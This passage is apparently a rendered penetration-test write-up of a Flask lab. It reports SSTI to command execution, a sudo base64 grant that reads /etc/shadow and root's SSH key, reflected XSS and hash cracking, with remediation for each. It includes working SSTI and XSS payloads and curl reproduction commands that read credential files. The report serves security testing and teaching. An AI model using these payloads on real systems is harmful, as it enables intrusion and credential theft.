+<h3 id="62-my-first-openssh-oracle-returned-false-for-a-passphrase-it-should-have-recovered">6.2 My first OpenSSH oracle returned <code>False</code> for a passphrase it should have recovered</h3>
+<p><strong>Symptom:</strong> <code>try_pw('KnownPass1', ctl1)</code> → <code>False</code>, where <code>ctl1</code> is a key I had just created with exactly that passphrase, and which <code>ssh-keygen -y -P 'KnownPass1'</code> opened without complaint.</p>
+<p><strong>Why it matters more than a normal bug:</strong> the failure is <strong>indistinguishable from &quot;the passphrase is strong&quot;</strong>. A negative from this oracle is byte-for-byte what a positive is when the passphrase is unguessable. Had I pointed it at the target and reported <em>&quot;the root key passphrase resisted 517,503 candidates&quot;</em>, I would have been reporting a failure to find a bug in my own parser.</p>
+<p><strong>Root cause, after four wrong guesses at the layout</strong> (salt truncated to 8 bytes instead of 16; <code>nkeys</code> read as a length-prefixed string when it is a bare <code>uint32</code>; the private section treated as the buffer remainder when it is itself length-prefixed; the CTR counter taken as a 64-bit int when OpenSSH's IV is a full 16-byte block). The fix was to <strong>stop reading the spec from memory and calibrate against a key whose passphrase I set</strong> — which is what the control was for.</p>
+<p><strong>Correction applied:</strong> the oracle was abandoned for <code>paramiko</code>, which is a <em>different implementation</em> from the <code>ssh-keygen</code> that will actually consume the key, and both were then cross-checked against each other (C1 vs C2).</p>
+<blockquote>
+<p><strong>Rule: the positive control of a cracker is not &quot;the hash matches&quot; — it is &quot;the cracker recovers a hash you already had the plaintext to&quot;.</strong> And the failure of that control looks <em>exactly</em> like the success in the interesting case, which is why the correct postcondition is a <strong>count identity</strong> (recoveries == expected recoveries), never a boolean verdict.</p>
+</blockquote>
+<h3 id="63-the-yescrypt-scanner-reported-not-found-for-1000-candidates-in-01-seconds">6.3 The yescrypt scanner reported &quot;not found&quot; for 1,000 candidates in 0.1 seconds</h3>
+<pre><code>RESULT hit=None  candidates=1000  elapsed=0.1s  rate=10705.7/s
+</code></pre>
+<p><strong>A KDF that costs 21 ms cannot be tried 10,705 times per second.</strong> The rate was the tell, before I looked at anything else.</p>
+<p><strong>Root cause:</strong> the scanner read the hash field as <code>split(':')[1]</code> of the <strong>first</strong> line of <code>/etc/shadow</code> — which is <code>root</code>, whose field is <code>*</code>. <code>crypt()</code> rejects <code>*</code> and returns <code>*0</code> <strong>immediately, without running the KDF</strong>. So the scanner was not slow, and it was not failing to find the password; <strong>it was not attempting a KDF at all</strong>, and its &quot;not found&quot; was a statement about my own argument list.</p>
+<p><strong>Correction applied:</strong> the control was moved <strong>inside the scanner</strong>. Every run now first verifies a hash whose plaintext is known and <strong>aborts</strong> if it cannot recover it, and separately aborts if <em>everything</em> verifies. Then:</p>
+<pre><code>target scheme/params : $j9T$  salt=&lt;22-char-salt&gt;...
+RESULT hit=None  candidates=1000  elapsed=5.9s  rate=170.0/s
+</code></pre>
+<p>Same list, same &quot;no hit&quot; verdict — and now a rate that is physically possible, which is what makes the negative trustworthy.</p>
+<blockquote>
+<p><strong>Rule: a control that runs once, by hand, is not a control — it is a memory of a control.</strong> The instrument must carry it, because the wiring between the oracle and the data is where the failure lives, and the wiring is not re-checked by a test suite.</p>
+<p><strong>And the generalisable tell for any offline verifier: watch the rate, not just the verdict.</strong> A KDF cracker that is <em>faster</em> than the KDF is a measurement of your own plumbing. Offline verifiers fail <strong>silently and instantly</strong>, with no error, no exception and no exit code — strictly worse than an online oracle, which at least costs a round trip and can fail loudly. <strong>Treat an implausible rate as a failed control, not as a fast target.</strong></p>
+</blockquote>
+<h3 id="64-smaller-corrections-for-the-record">6.4 Smaller corrections, for the record</h3>
+<ul>
+<li>I first read <code>kdfopt</code> as 8 bytes of salt and got a 16-byte-per-user salt only because the length arithmetic did not close. <strong>A parameter block that does not sum to its own declared length is a parse error, not a value.</strong></li>
+<li><code>crypt(pw, &quot;$y$&quot;)</code> does not return the library's default parameters — it returns <code>*0</code>, because the salt is empty. <strong>There is no API that hands you &quot;the default&quot;; the only way to learn the default is to make a hash with the default tool.</strong> That is the whole of §6.1.</li>
+<li>I assumed <code>/root</code> was unreachable and searched for a write primitive before reading <code>base64 --help</code>. The grant is a <em>read</em> primitive, which is a materially smaller finding. <strong>Read the tool's own interface before designing an escalation against it.</strong></li>
+</ul>
+<hr />
+<h2 id="7-findings">7. Findings</h2>
+<h3 id="f1--unauthenticated-server-side-template-injection--rce-as-verde--cwe-1336--high">F1 — Unauthenticated Server-Side Template Injection → RCE as <code>verde</code> — <strong>CWE-1336</strong> — High</h3>
+<p><strong>Evidence.</strong> <code>__init__.py</code> splices <code>request.args['user']</code> into template <em>source</em> with <code>str.format</code>, then calls <code>render_template_string</code>:</p>
+<pre><code>?user={{7*7}}    →  &lt;h1&gt;Hola 49&lt;/h1&gt;
+?user={{ cycler.__init__.__globals__.os.popen('id').read() }}
+                  →  Hola uid=1000(verde) gid=1000(verde) groups=1000(verde)
+</code></pre>
+<p><strong>Impact.</strong> Unauthenticated command execution on the host as an unprivileged service account, with no credential and no session. From there, the sudoers grant of §F2 is immediately reachable.</p>
+<p><strong>Root cause.</strong> Untrusted input composed into a template <em>string</em> rather than passed to <code>render_template</code> as a <em>variable</em>. Autoescaping is enabled and irrelevant: it operates on output, and the attacker controls the source.</p>
+<p><strong>Remediation.</strong> <code>return render_template(&quot;index.html&quot;, user=user)</code>. Never call <code>render_template_string</code> on a string that any request data can reach — including when that data is only <code>.format()</code>-substituted one level down. Autoescape is not a mitigation for this class.</p>
+<h3 id="f2--sudoers-grants-a-non-root-account-a-root-executed-file-reader--cwe-250--cwe-732--high">F2 — Sudoers grants a non-root account a root-executed file reader — <strong>CWE-250 / CWE-732</strong> — High</h3>
+<p><strong>Evidence.</strong></p>
+<pre><code>verde	ALL=(root) NOPASSWD: /usr/bin/base64
+$ sudo -n /usr/bin/base64 -w0 /etc/shadow        → full /etc/shadow
+$ sudo -n /usr/bin/base64 -w0 /root/.ssh/id_rsa  → root's private key
+$ sudo -n /usr/bin/base64 --help                 → &quot;...to standard output&quot;  (no -o)
+$ printf &quot;aW91ZCAxCg==&quot; | sudo -n base64 -d &gt; /tmp/pwn
+$ stat -c &quot;%U %a&quot; /tmp/pwn                       → verde 644      (the write is NOT root)
+$ sudo -n /usr/bin/{id,cat,tee} /bin/{id,sh}     → all &quot;sudo: a password is required&quot;
+</code></pre>
+<p><strong>Impact.</strong> <strong>Arbitrary root-only file read</strong>, as a passwordless, non-interactive, non-logged-in account. The result in this lab is total compromise of credential confidentiality: the full password database and root's SSH private key. <code>root</code>'s home is <code>0700</code>, so without this grant it is unreachable — the grant is the entire traversal.</p>
+<p><strong>Root cause.</strong> A filter binary granted with <code>NOPASSWD</code> and an unrestricted argument list. The policy trusts a program whose only capability is to <em>read</em>; a filter is the wrong class of program for any privilege grant, because its value to an attacker is entirely in the <strong>file name it is handed</strong>.</p>
+<p><strong>Remediation.</strong> Delete the line. If a base64 helper is genuinely needed, expose it as a purpose-built binary that accepts no file argument, and grant it with an explicit <code>Cmnd_Alias</code> argument list. Broader rule: <strong>never grant <code>NOPASSWD</code> to a program that takes a path as an argument.</strong></p>
+<p><strong>Classification note for the repo's existing sudoers doctrine.</strong> That doctrine has two classes — <em>argument-taking</em> and <em>runtime-spawned shell</em> — and <strong>both are RCE</strong>. <code>base64</code> is a <strong>third class: argument-taking, but the argument is a file to read and the tool has no output-file option, so the grant is a confidentiality primitive, not code execution.</strong> Report it as such. Filing it as &quot;sudo to an interpreter, therefore RCE&quot; would be wrong in both directions: it would overstate the primitive and send the reviewer to patch the wrong thing.</p>
+<h3 id="f3--reflected-xss-in-the-same-parameter--cwe-79--medium">F3 — Reflected XSS in the same parameter — <strong>CWE-79</strong> — Medium</h3>
+<p><strong>Evidence.</strong></p>
+<pre><code>?user=&lt;script&gt;alert(1)&lt;/script&gt;  →  &lt;h1&gt;Hola &lt;script&gt;alert(1)&lt;/script&gt;&lt;/h1&gt;
+?user=hola                        →  &lt;h1&gt;Hola hola&lt;/h1&gt;                (control)
+</code></pre>
+<p>Reflection is into an <strong>HTML text node</strong> with no escaping, per the sink-context test — not into a JSON string, not an attribute. There is no session cookie or authentication in this app, so the practical ceiling is script execution in an origin that holds nothing; the rate is Medium on the strength of the primitive, not on a demonstrated account takeover, and this report does <strong>not</strong> claim one.</p>
+<p><strong>Root cause.</strong> Same <code>.format()</code> splice as F1, reaching the output layer as well as the source layer.</p>
+<p><strong>Remediation.</strong> F1's fix removes both. If the value must be rendered, <code>render_template</code> with autoescaping on is sufficient; if it must be HTML, sanitize it.</p>
+<h3 id="f4--application-source-git-metadata-and-a-full-virtualenv-served-unauthenticated--cwe-527--cwe-538--low">F4 — Application source, Git metadata and a full virtualenv served unauthenticated — <strong>CWE-527 / CWE-538</strong> — Low</h3>
+<p><strong>Evidence.</strong> <code>/ssti/.git/HEAD</code> <code>200</code>, <code>/ssti/.git/config</code> <code>200</code> (leaks the upstream repository URL), <code>/ssti/.git/index</code> <code>200</code>, <code>/ssti/__init__.py</code> <code>200</code>, <code>/ssti/venv/</code> <code>200</code> with <code>bin/ lib/ lib64/ pyvenv.cfg</code> browsable. History is <em>not</em> exfiltrable — <code>objects/info/packs</code> is <code>404</code> and <code>git fetch</code> over dumb HTTP fails — so the working tree is the whole of the exposure.</p>
+<p><strong>Impact.</strong> Low in this lab, because the application is a public toy. The finding is the <strong>pattern</strong>: an Apache <code>DocumentRoot</code> pointing at a checkout that includes the checkout metadata.</p>
+<p><strong>Remediation.</strong> Serve the application directory from a path outside the document root, or deny <code>.git</code> and <code>venv</code> explicitly. <code>git clone</code> into a deployment directory is the root cause; deploy a build artifact.</p>
+<h3 id="f5--credential-exposure--reported-explicitly-not-a-weak-hash-finding">F5 — Credential exposure — <strong>reported, explicitly NOT a weak-hash finding</strong></h3>
+<blockquote>
+<p><code>/etc/shadow</code> was readable by a non-root account (via F2). The <code>verde</code> entry is <strong>yescrypt at libxcrypt's default cost</strong> — measured at 21.4 ms/candidate, and confirmed at the <em>identical</em> parameter triplet by a control account created on the same image. It was cracked in <strong>196 candidates / 2.3 s</strong> and the credential authenticates successfully to <code>verde</code> over SSH. <strong>This is a credential-exposure finding (CWE-522 / CWE-250), not CWE-328 and not CWE-916</strong>, and the credential itself <strong>grants no additional reach</strong>, because the SSTI primitive already ran as <code>verde</code>.</p>
+</blockquote>
+<blockquote>
+<p>Root's RSA-4096 private key was readable via the same grant. It is encrypted with <code>aes256-ctr</code> under <strong>bcrypt_pbkdf at <code>rounds=16</code>, the OpenSSH default</strong> — a strong KDF. The key is <strong>exposed but not trivially attackable</strong>. Its passphrase was <strong>not recovered</strong> after <strong>112,217 candidates</strong> across six candidate sets at 20–47 cand/s (§4.4); exhausting the available 517,503-line list projects to a further <strong>~2.9 h</strong> of 5-core compute. Root was not obtained.</p>
+</blockquote>
+<p><strong>Why this is written as a note and not a numbered finding:</strong> the weakness that made both hashes attackable is <strong>F2</strong>. Reporting &quot;credential cracked&quot; as its own finding would attribute to the crypto a defect that lives in the sudoers line.</p>
+<hr />
+<h2 id="8-not-recovered-vs-ruled-out-with-reason">8. &quot;Not recovered&quot; vs &quot;ruled out, with reason&quot;</h2>
+<p>The distinction is the deliverable of this section. Nothing below is a gap dressed as a negative.</p>
+<h3 id="81-not-tested-no-time--out-of-budget">8.1 Not tested (no time / out of budget)</h3>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Why not</th>
+<th>What it would have cost</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Full 517,503-line list against the root key</td>
+<td>stopped at <strong>100,000</strong> (19.3%) by the budget decision in §4.4; 2.9 h would remain</td>
+<td>~2.9 h</td>
+</tr>
+<tr>
+<td><code>sorted-passwords.txt</code> (101,074) and <code>2025-sort-uniq-words.txt</code> (131,887) against the root key</td>
+<td>same 72 ms/candidate, same lexicographic prior; a second and third multi-hour pass</td>
+<td>~42 min, ~52 min</td>
+</tr>
+<tr>
+<td>Brute force beyond the lists (masks, rule-based mutation of a frequency core)</td>
+<td>unbounded; a lab passphrase is not a masked one</td>
+<td>—</td>
+</tr>
+<tr>
+<td>GPU offload</td>
+<td>no <code>hashcat</code>, no <code>john</code> on this host; the rate above is CPU-only and the report says so</td>
+<td>—</td>
+</tr>
+</tbody>
+</table>
+<h3 id="82-ruled-out-with-the-reason">8.2 Ruled out, with the reason</h3>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Verdict</th>
+<th>Reason</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Root escalation via a <strong>write</strong> through the sudoers grant</td>
+<td><strong>Impossible</strong></td>
+<td><code>base64 --help</code> shows stdout-only output; <code>-o</code> is rejected; the shell redirect's owning uid is <code>verde</code> (C13)</td>
+</tr>
+<tr>
+<td>SUID / file-capability escalation</td>
+<td><strong>Absent</strong></td>
+<td><code>find / -perm -4000 -o -perm -2000</code> → stock Debian set; <code>getcap -r /</code> → empty</td>
+</tr>
+<tr>
+<td>Cron-based escalation</td>
+<td><strong>Absent</strong></td>
+<td><code>/etc/cron.d</code> holds only <code>e2scrub_all</code>; no <code>/var/spool/cron/crontabs</code></td>
+</tr>
+<tr>
+<td>Docker-socket escape</td>
+<td><strong>Absent</strong></td>
+<td><code>/var/run/docker.sock</code> does not exist</td>
+</tr>
+<tr>
+<td>Root login by password</td>
+<td><strong>Blocked</strong></td>
+<td><code>PermitRootLogin</code> unset → <code>prohibit-password</code>; live server offers <code>publickey, password</code>; <code>root / &lt;recovered-green-phrase&gt;</code> → <code>AuthenticationException</code></td>
+</tr>
+<tr>
+<td>Root login by the recovered key</td>
+<td><strong>Conditional</strong></td>
+<td>key↔<code>authorized_keys</code> pairing <strong>proven</strong> by matching fingerprint; blocked solely on the passphrase (§4.4)</td>
+</tr>
+<tr>
+<td>Git history exfiltration</td>
+<td><strong>Impossible</strong></td>
+<td><code>objects/info/packs</code> → <code>404</code>; <code>git fetch</code> → <code>repository not found</code></td>
+</tr>
+<tr>
+<td>Weak-hash finding on either hash</td>
+<td><strong>Refuted</strong></td>
+<td>yescrypt triplet matched a fresh control account on the same image (C14); key KDF at OpenSSH's default <code>rounds=16</code></td>
+</tr>
+<tr>
+<td>Stored XSS</td>
+<td><strong>Not present</strong></td>
+<td>one reflected parameter, no persistence, no second user in the app</td>
+</tr>
+<tr>
+<td>SSTI → root directly</td>
+<td><strong>Not available</strong></td>
+<td>the app is launched under <code>su - verde</code>; the gadget returned <code>uid=1000</code>, and no other route to root exists from <code>verde</code> except F2</td>
+</tr>
+</tbody>
+</table>
+<h3 id="83-reward">8.3 Reward</h3>
+<pre><code>$ grep -rIl &quot;FLAG{&quot; / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev
+(no output)
+$ for u in :8089/ :8089/static/ :/ ; do curl -s $u | grep -coE 'FLAG\{' ; done
+0
+0
+0
+</code></pre>
+<p><code>/root/flag.txt</code>, <code>/root/flag</code>, <code>/root/.flag</code> and <code>/root/secret.txt</code> were each requested through the F2 grant and each returned <code>No such file or directory</code>. <strong>There is no reward in this lab.</strong> Reported as absence, with the search and the four root-only paths named — not as a value, and not rounded off.</p>
+<hr />
+<h2 id="9-design-observation--the-lab-teaches-the-wrong-lesson-deliberately">9. Design observation — the lab teaches the wrong lesson, deliberately</h2>
+<p>The lab ships the public <code>ssti-flask-hacking-playground</code> and adds a sudoers grant and a root key. Its description promises <em>&quot;privilege escalation by cracking hashes&quot;</em>, and the hashes are real and crackable. <strong>But the crackable one belongs to the account the SSTI already gave you.</strong> The escalation that actually exists runs the other way:</p>
+<blockquote>
+<p><strong>You do not crack your way up. You use a misconfigured sudoers line to read a root key, and then you are one passphrase from root — which is a different problem, with a different cost, and a different report.</strong></p>
+</blockquote>
+<p>That is an unusually honest lesson, arriving by accident. The conventional shape of this lab would be <code>SSTI → user → crack that user's hash → SSH as that user → sudo → root</code>, and it would be a <strong>self-confirming loop</strong> in the middle: the hash protects an account the attacker already owns, so the report would print &quot;credential cracked&quot; while the reachability of that credential had never changed. A tester who reports the credential as a finding has measured a fact about their own position and filed it as a fact about the target's.</p>
+<p>Two smaller design points:</p>
+<ul>
+<li><strong><code>su - verde</code> around the app is the correct choice</strong> and the report should say so. A Flask app on port 8089 with <code>render_template_string</code> that ran as root would make the whole exercise trivial. The <code>uid=1000</code> is what makes F2 reachable and F1 bounded.</li>
+<li><strong>The <code>base64</code> grant is a good, quiet test of the grant-naming-an-interpreter doctrine</strong>, precisely because a reader will classify it as RCE on sight. Its actual class — <em>read, not write</em> — is only visible in <code>base64 --help</code>, and the difference is a full severity grade.</li>
+</ul>
+<hr />
+<h2 id="10-what-generalises">10. What generalises</h2>
+<ol>
+<li><strong>A broken hash is not a finding; the weakness that made it attackable is.</strong> Both hashes here are at distribution-default cost. The finding is the sudoers line.</li>
+<li><strong>Read the KDF's cost, do not read its parameters — and get the baseline by building a control, not by opening a document.</strong></li>
+<li><strong>A crack that returns an account you already own is worth zero reach, and the report must say zero.</strong> The number to publish is <em>candidates / seconds / rate / and what it bought</em>.</li>
+<li><strong>The positive control of a cracker is &quot;it recovers a hash whose plaintext you had&quot;, and its failure looks exactly like a strong passphrase.</strong> State the postcondition as a <strong>count identity</strong>, never a boolean.</li>
+<li><strong>The control must live inside the instrument.</strong> A control run once by hand is a memory, and the wiring is where the failure is.</li>
+<li><strong>An implausible rate is a failed control.</strong> An offline verifier fails silently and instantly; 10,705 KDFs/second means the KDF never ran.</li>
+<li><strong>A third class of sudoers grant exists: argument-taking, no output-file option → confidentiality, not RCE.</strong> Both existing classes are RCE, so the taxonomy needs this one.</li>
+<li><strong>Measure the write's identity, not the write's success.</strong> A redirect through <code>sudo</code> succeeds and is still unprivileged.</li>
+</ol>
+<hr />
+<h2 id="11-appendix--reproduction">11. Appendix — reproduction</h2>
+<pre><code class="language-bash"># 1. surface
+nmap -sV -Pn -p- [net-0-20]
+
+# 2. SSTI, identity first
+curl -s -G http://[net-0-20]:8089/ --data-urlencode 'user={{7*7}}'
+curl -s -G http://[net-0-20]:8089/ --data-urlencode \
+  &quot;user={{ cycler.__init__.__globals__.os.popen('id').read() }}&quot;
+
+# 3. the grant, and what class of primitive it is
+curl -s -G http://[net-0-20]:8089/ --data-urlencode &quot;user={{ cycler.__init__.__globals__.os.popen('sudo -n -l').read() }}&quot;
+curl -s -G http://[net-0-20]:8089/ --data-urlencode &quot;user={{ cycler.__init__.__globals__.os.popen('sudo -n /usr/bin/base64 --help').read() }}&quot;
+
+# 4. hashes
+curl -s -G http://[net-0-20]:8089/ --data-urlencode \
+  &quot;user={{ cycler.__init__.__globals__.os.popen('sudo -n /usr/bin/base64 -w0 /etc/shadow').read() }}&quot;
+
+# 5. the two control keys the oracle was validated against
+ssh-keygen -t rsa -b 2048 -N 'KnownPass1'    -C ctl1 -f ctl1 -q
+ssh-keygen -t rsa -b 2048 -N 'AnotherUser99' -C ctl2 -f ctl2 -q
+</code></pre>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
